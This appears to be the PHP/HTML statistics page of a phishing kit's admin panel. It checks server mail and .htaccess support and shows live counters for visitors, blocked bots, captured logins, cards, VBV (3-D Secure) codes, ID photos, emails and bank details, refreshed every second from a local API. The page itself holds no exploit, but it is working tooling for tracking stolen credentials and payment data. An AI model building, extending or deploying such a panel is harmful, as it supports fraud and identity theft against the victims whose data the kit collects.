<div class="p-2 rounded bg-gray-100 m-3">
    <table class="table-auto border border-gray-500 border-collapse w-full">
        <tr class="border">
            <td>PHP Version</td><td>:: <?=get_php_ver();?></td>
</tr>
<tr class="border">
            <td>mail() support </td><td>:: <?=mail_support();?></td>
        </tr>
        <tr class="border">
            <td>Apache2 htacess support</td><td>:: <?= htaccess_apache();?></td>
        </tr>
    </table>
</div>
<div class="grid grid-cols-3 gap-5">
    <?php
    if(pconfig('STATISTIC_PANEL','total_access') == true){ ?>
<div class=" flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
          
            <svg class="w-10 h-10 p-2 bg-pink-100 stroke-current text-pink-500 rounded-full"" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M2 11a1 1 0 011-1h2a1 1 0 011 1v5a1 1 0 01-1 1H3a1 1 0 01-1-1v-5zM8 7a1 1 0 011-1h2a1 1 0 011 1v9a1 1 0 01-1 1H9a1 1 0 01-1-1V7zM14 4a1 1 0 011-1h2a1 1 0 011 1v12a1 1 0 01-1 1h-2a1 1 0 01-1-1V4z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="access">0</p>
                <p class="text-xs text-gray-600">Total Access</p>
            </div>
        </div>
        <?php
    }

    if(pconfig('STATISTIC_PANEL' , 'count_visitor') == true){
    ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-green-100 stroke-current text-green-500 rounded-full" fill="none" stroke="currentColor" view-box="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="visitor">0</p>
                <p class="text-xs text-gray-600">Visitor</p>
            </div>
        </div>
        <?php
    }

    if(pconfig('STATISTIC_PANEL' , 'count_bot') == true) {

        ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-gray-100 stroke-current text-gray-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="bot">0</p>
                <p class="text-xs text-gray-600">Bot</p>
            </div>
        </div>
        <?php
    }

    if(pconfig('STATISTIC_PANEL' , 'count_login') == true){

        ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-indigo-100 stroke-current text-indigo-500 rounded-full" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 3a1 1 0 011 1v12a1 1 0 11-2 0V4a1 1 0 011-1zm7.707 3.293a1 1 0 010 1.414L9.414 9H17a1 1 0 110 2H9.414l1.293 1.293a1 1 0 01-1.414 1.414l-3-3a1 1 0 010-1.414l3-3a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="login">0</p>
                <p class="text-xs text-gray-600">Login</p>
            </div>
        </div>

        <?php
    }

    if(pconfig('STATISTIC_PANEL' , 'count_card') == true){
    ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-red-100 stroke-current text-red-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="card">0</p>
                <p class="text-xs text-gray-600">Card</p>
            </div>
        </div>
    <?php
    }
    if(pconfig('STATISTIC_PANEL' , 'count_vbv') == true){

    ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-yellow-100 stroke-current text-yellow-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="vbv">0</p>
                <p class="text-xs text-gray-600">VBV</p>
            </div>
        </div>
        <?php
    }
    if(pconfig('STATISTIC_PANEL' , 'count_photo') == true){

        ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-gray-200 stroke-current text-blue-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="pap">0</p>
                <p class="text-xs text-gray-600">Photo</p>
            </div>
        </div>
        <?php
    }
        if(pconfig('STATISTIC_PANEL' , 'count_email') == true){
            ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-gray-200 stroke-current text-blue-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="email">0</p>
                <p class="text-xs text-gray-600">Email</p>
            </div>
        </div>

        <?php
        }

        if(pconfig('STATISTIC_PANEL' , 'count_bank') == true) {

            ?>
        <div class="flex flex-row bg-white rounded-lg shadow-md p-10 gap-x-5 items-center">
            <svg class="w-10 h-10 p-2 bg-pink-100 stroke-current text-pink-500 rounded-full" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z"></path></svg>
            <div>
                <p class="font-semibold text-xl" id="bank">0</p>
                <p class="text-xs text-gray-600">Bank</p>
            </div>
        </div>
        <?php
        }
        ?>
    </div>

<script>
setInterval(function(){
fetch('?api=home_api').then(response => response.json() ).then(data => {
      document.getElementById('email').innerText = data.email;
    document.getElementById('pap').innerText = data.pap;
    document.getElementById('visitor').innerText = data.visitor;
    document.getElementById('access').innerText = data.access;
    document.getElementById('bot').innerText = data.bot;
    document.getElementById('login').innerText = data.login;
    document.getElementById('card').innerText = data.card;
    document.getElementById('vbv').innerText = data.vbv;
    document.getElementById('bank').innerText = data.bank;
  


});

},1000);

</script>